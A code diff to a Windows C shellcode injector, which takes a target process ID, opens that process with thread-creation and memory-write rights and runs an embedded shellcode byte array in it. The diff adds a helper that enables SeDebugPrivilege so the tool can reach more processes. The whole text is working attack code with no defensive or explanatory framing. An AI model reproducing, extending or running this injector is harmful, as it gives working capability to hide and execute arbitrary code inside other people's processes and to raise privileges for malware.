@@ -10,6 +10,8 @@ BYTE shellcode[] =
 	"\x8B\x51\x40\x8B\x5A\x28\x81\xFB\x6B\x00\x65\x00\x74\x1C\x81\xFB";
 
 
+BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
+
 int _tmain(int argc, TCHAR* argv[]) {
 
 	if (argc != 2) {
@@ -21,6 +23,12 @@ int _tmain(int argc, TCHAR* argv[]) {
 	if (PID == 0) {
 		_tprintf(_T("[x] Invalid PID\n"));
 		return 0;
+	}
+
+	HANDLE hToken;
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
+		SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
+		CloseHandle(hToken);
 	}
 
 	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);
@@ -57,4 +65,31 @@ int _tmain(int argc, TCHAR* argv[]) {
 	CloseHandle(hThread);
 
 	return 0;
+}
+
+BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
+
+	LUID luid;
+	BOOL bRet = FALSE;
+
+	if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
+	{
+		TOKEN_PRIVILEGES tp;
+
+		tp.PrivilegeCount = 1;
+		tp.Privileges[0].Luid = luid;
+		tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;
+		//
+		//  Enable the privilege or disable all privileges.
+		//
+		if (AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
+		{
+			//
+			//  Check to see if you have proper access.
+			//  You may get "ERROR_NOT_ALL_ASSIGNED".
+			//
+			bRet = (GetLastError() == ERROR_SUCCESS);
+		}
+	}
+	return bRet;
 }
